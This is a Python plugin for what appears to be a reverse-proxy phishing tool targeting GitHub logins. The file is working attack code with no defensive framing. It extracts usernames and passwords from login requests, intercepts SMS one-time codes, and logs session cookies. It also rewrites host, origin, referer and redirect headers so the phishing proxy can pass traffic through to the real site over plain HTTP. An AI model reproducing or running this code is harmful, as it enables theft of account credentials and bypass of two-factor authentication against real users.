import urllib.parse

# The hostname the client is sending requests to
actual_host: str


def modify_request(
    request_parameters: dict[str, str],
    request_headers: dict[str, list[str]],
    request_body: bytes,
) -> tuple[dict[str, str], dict[str, list[str]], bytes]:

    global actual_host

    # Get route
    log: str = ""  # Log
    log += "[plugins/github.com:modify_request] %s request for %s\n" % (
        request_parameters["method"],
        request_parameters["route"],
    )  # Log

    # Get username and password
    if (
        request_parameters["route"] == "/session"
        and request_parameters["method"] == "POST"
    ):
        username = request_body.split(b"&login=")[1].split(b"&")[0].decode()
        username = urllib.parse.unquote(username)

        password = request_body.split(b"&password=")[1].split(b"&")[0].decode()
        password = urllib.parse.unquote(password)
        log += "[plugins/github.com:modify_request] Found credentials -> %s:%s\n" % (
            username,
            password,
        )

    # Get SMS OTP code
    if request_parameters["route"] == "/sessions/two-factor":
        sms_otp = request_body.split(b"&")[1].split(b"=")[1]
        log += "[plugins/github.com:modify_request] SMS OTP Intercepted -> %s\n" % (
            sms_otp.decode()
        )  # Log

    # Get cookie values if requesting dashboard (means the user logged in succesfully)
    if "cookie" in request_headers and (
        request_parameters["route"] == "/dashboard"
        or request_parameters["route"] == "/"
    ):
        cookies = request_headers["cookie"][0]
        for cookie in cookies.split(";"):
            _cookie_name = cookie.split("=")[0]
            log += "[plugins/github.com:modify_request] Intercepted cookie -> %s\n" % (
                cookie
            )  # Log
    print(log.strip())  # Log

    # Modify host
    actual_host = request_headers["host"][0]
    request_headers["host"][0] = "github.com"

    # Modify origin and refer
    if "origin" in request_headers:
        request_headers["origin"][0] = request_headers["origin"][0].replace(
            actual_host, "github.com"
        )
        request_headers["origin"][0] = request_headers["origin"][0].replace(
            "http:", "https:"
        )

    if "refer" in request_headers:
        request_headers["refer"][0] = request_headers["refer"][0].replace(
            actual_host, "github.com"
        )
        request_headers["refer"][0] = request_headers["refer"][0].replace(
            "http:", "https:"
        )

    # Do not upgrade to HTTPS
    if "upgrade-insecure-requests" in request_headers:
        del request_headers["upgrade-insecure-requests"]

    return request_parameters, request_headers, request_body


def modify_response(
    response_parameters: dict[str, str],
    response_headers: dict[str, list[str]],
    response_body: bytes,
) -> tuple[dict[str, str], dict[str, list[str]], bytes]:

    if response_parameters["status_code"] == "302" and "location" in response_headers:
        response_headers["location"][0] = response_headers["location"][0].replace(
            "github.com", actual_host
        )
        response_headers["location"][0] = response_headers["location"][0].replace(
            "https:", "http:"
        )

    return response_parameters, response_headers, response_body
